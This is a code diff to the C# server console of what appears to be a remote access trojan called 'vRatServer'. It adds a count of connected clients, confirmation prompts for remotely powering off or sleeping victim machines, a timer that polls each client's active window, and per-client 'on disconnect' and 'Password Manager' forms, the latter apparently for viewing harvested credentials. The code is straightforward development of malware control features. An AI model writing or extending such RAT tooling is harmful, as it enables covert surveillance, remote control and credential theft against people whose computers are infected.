@@ -14,6 +14,21 @@ namespace vRatServer
 {
     public partial class MainForm : Form
     {
+        public NotifyIcon n = new NotifyIcon();
+        static int count = 0;
+        static string orgname = "";
+        
+
+        
+
+       
+        public void updateCount(bool connected)
+        {
+            if (connected) { count++; }
+            else { count--; }
+            this.Text = orgname+"       [Connected : " + count.ToString() + " ]";
+
+        }
         public MainForm()
         {
             InitializeComponent();
@@ -45,6 +60,8 @@ namespace vRatServer
 
         private void MainForm_Load(object sender, EventArgs e)
         {
+            orgname = this.Text;
+            
 
         }
 
@@ -211,6 +228,10 @@ namespace vRatServer
 
         private void powerOffToolStripMenuItem_Click(object sender, EventArgs e)
         {
+            if (MessageBox.Show("Are you sure you want to poweroff ?", "Confirm", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.No)
+            {
+                return;
+            }
             var t = listView1.SelectedItems;
             byte[] r = null;
             if (t.Count == 0) { return; }
@@ -226,7 +247,10 @@ namespace vRatServer
 
         private void sleepToolStripMenuItem_Click(object sender, EventArgs e)
         {
-
+            if (MessageBox.Show("Are you sure you want to sleep ?", "Confirm", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.No)
+            {
+                return;
+            }
             var t = listView1.SelectedItems;
             byte[] r = null;
             if (t.Count == 0) { return; }
@@ -261,5 +285,67 @@ namespace vRatServer
             f.Show();
 
         }
+
+ 
+        private void getWindowUpdatesTimer_Tick(object sender, EventArgs e)
+        {
+            byte[]? r = null;
+            foreach (ListViewItem item in Program.f1.listView1.Items)
+            {
+                Client cli = (Client)item.Tag;
+                globals.SendPacket(cli, (byte)globals.PacketType.getwindow, 0, 0, ref r);
+
+
+            }
+        }
+
+       
+
+        private void onDisconnectToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            var t = listView1.SelectedItems;
+            if (t.Count == 0) { return; }
+
+
+            foreach (ListViewItem i in t)
+            {
+                Client cli = (Client)i.Tag;
+                if (cli.ondsc == null)
+                {
+                    var f = new Forms.OnDisconnect(cli);
+                    f.Show();
+                }
+                else
+                {
+                    cli.ondsc.BringToFront();
+                }
+
+            }
+        }
+
+       
+
+        private void passwordManagerToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            
+            var t = listView1.SelectedItems;
+            if (t.Count == 0) { return; }
+
+
+            foreach (ListViewItem i in t)
+            {
+                Client cli = (Client)i.Tag;
+                if (cli.pam == null)
+                {
+                    var f = new Forms.PasswordManager(cli);
+                    f.Show();
+                }
+               else
+                {
+                    cli.pam.BringToFront();
+                }
+
+            }
+        }
     }
-}
+    }
